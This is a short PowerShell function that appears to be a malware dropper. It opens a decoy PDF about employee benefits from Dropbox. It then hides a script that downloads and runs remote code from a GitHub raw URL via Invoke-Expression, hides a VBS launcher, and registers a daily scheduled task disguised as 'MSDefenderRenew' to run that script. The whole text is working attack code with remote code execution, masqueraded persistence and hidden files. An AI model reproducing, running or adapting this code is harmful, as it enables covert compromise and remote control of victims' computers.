Function Refresh
{
start https://www.dropbox.com/s/fu8oymht9jijg9g/2015NonContract_Benefits%40Glance.pdf?raw=1
New-Item $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\configms.txt -type file -force
Add-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\configms.txt "IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/grunz01/may/master/server.ps1')); FetchCommands -Force"
Set-ItemProperty -Path $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\configms.txt -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
schtasks /create  /TN MSDefenderRenew /TR 'C:\Windows\System32\WScript.exe //Nologo //B %UserProfile%\AppData\Local\Microsoft\Windows\Explorer\Initialize.vbs' /SC DAILY /ST 09:00:00
New-Item $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\Initialize.txt -type file -force
$Job = '"& {Start-Job -RunAs32 -ScriptBlock {Invoke-Command -ScriptBlock {Get-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\configms.txt | Invoke-Expression}}}"'
Add-Content $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\Initialize.txt "Dim objShell`r`nSet objShell = WScript.CreateObject( ""WScript.Shell"" )`r`ncommand = ""powershell.exe -noexit `"$Job`" -command"" `r`nobjShell.Run command,0`r`nSet objShell = Nothing"
Rename-Item $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\Initialize.txt Initialize.vbs
Set-ItemProperty -Path $env:UserProfile\AppData\Local\Microsoft\Windows\Explorer\Initialize.vbs -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
schtasks /run /tn MSDefenderRenew
}  